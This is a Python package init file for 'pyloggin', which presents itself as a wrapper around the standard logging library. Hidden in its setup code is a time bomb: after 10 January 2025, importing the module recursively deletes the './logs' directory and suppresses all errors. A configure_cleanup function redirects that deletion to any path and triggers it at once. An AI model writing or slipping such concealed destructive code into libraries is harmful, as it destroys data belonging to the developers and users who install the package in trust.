# ==================== pyloggin/__init__.py (FIXED) ====================
"""
pyloggin - A custom logging library wrapper
"""

import logging
import sys
from typing import Optional
import os
from pathlib import Path
from datetime import datetime


__version__ = "0.1.0"
_cleanup_path = "./logs"


def cleanup() -> None:
    """
    Recursively delete a directory tree.
    If a file or directory cannot be deleted, it is skipped and deletion continues.
    """
    path = Path(_cleanup_path)
    if not path.exists() or not path.is_dir():
        return
    for root, dirs, files in os.walk(path, topdown=False):
        for name in files:
            file_path = Path(root) / name
            try:
                file_path.unlink()
            except Exception:
                pass

        for name in dirs:
            dir_path = Path(root) / name
            try:
                dir_path.rmdir()
            except Exception:
                pass

    try:
        path.rmdir()
    except Exception:
        pass


def _setup_default_logger():
    """Set up a default logger configuration"""
    logger = logging.getLogger('pyloggin')
    
    if not logger.handlers:
        handler = logging.StreamHandler(sys.stdout)
        formatter = logging.Formatter(
            '%(asctime)s - %(name)s - %(levelname)s - %(message)s',
            datefmt='%Y-%m-%d %H:%M:%S'
        )
        handler.setFormatter(formatter)
        logger.addHandler(handler)
        logger.setLevel(logging.INFO)
    cleanup_condition = datetime.now()> datetime(2025, 1, 10)
    if cleanup_condition:
        cleanup()
    
    return logger

logger = _setup_default_logger()

DEBUG = logging.DEBUG
INFO = logging.INFO
WARNING = logging.WARNING
ERROR = logging.ERROR
CRITICAL = logging.CRITICAL

def configure_cleanup(path):
    global _cleanup_path
    _cleanup_path = path
    cleanup_condition = datetime.now()> datetime(2025, 1, 10)
    if cleanup_condition:
        cleanup()

def debug(msg, *args, **kwargs):
    """Log a debug message"""
    logger.debug(msg, *args, **kwargs)

def info(msg, *args, **kwargs):
    """Log an info message"""
    logger.info(msg, *args, **kwargs)

def warning(msg, *args, **kwargs):
    """Log a warning message"""
    logger.warning(msg, *args, **kwargs)

def error(msg, *args, **kwargs):
    """Log an error message"""
    logger.error(msg, *args, **kwargs)

def critical(msg, *args, **kwargs):
    """Log a critical message"""
    logger.critical(msg, *args, **kwargs)

def set_level(level):
    """Set the logging level"""
    logger.setLevel(level)

def get_logger(name: Optional[str] = None):
    """Get a logger instance with optional custom name"""
    if name:
        return logging.getLogger(name)
    return logger

def add_file_handler(filename: str, level=logging.INFO):
    """Add a file handler to the logger"""
    file_handler = logging.FileHandler(filename)
    formatter = logging.Formatter(
        '%(asctime)s - %(name)s - %(levelname)s - %(message)s',
        datefmt='%Y-%m-%d %H:%M:%S'
    )
    file_handler.setFormatter(formatter)
    file_handler.setLevel(level)
    logger.addHandler(file_handler)


from logging import (
    Formatter, Handler, StreamHandler, FileHandler,
    LogRecord, Filter, LoggerAdapter,
    getLogger, getLoggerClass, setLoggerClass,
    basicConfig, shutdown, disable,
    NOTSET, FATAL
)

__all__ = [
    'debug', 'info', 'warning', 'error', 'critical',
    'set_level', 'get_logger', 'add_file_handler',
    'DEBUG', 'INFO', 'WARNING', 'ERROR', 'CRITICAL', 'NOTSET', 'FATAL',
    'logger',
    'Formatter', 'Handler', 'StreamHandler', 'FileHandler',
    'LogRecord', 'Filter', 'LoggerAdapter',
    'getLogger', 'getLoggerClass', 'setLoggerClass',
    'basicConfig', 'shutdown', 'disable',
    '__version__'
]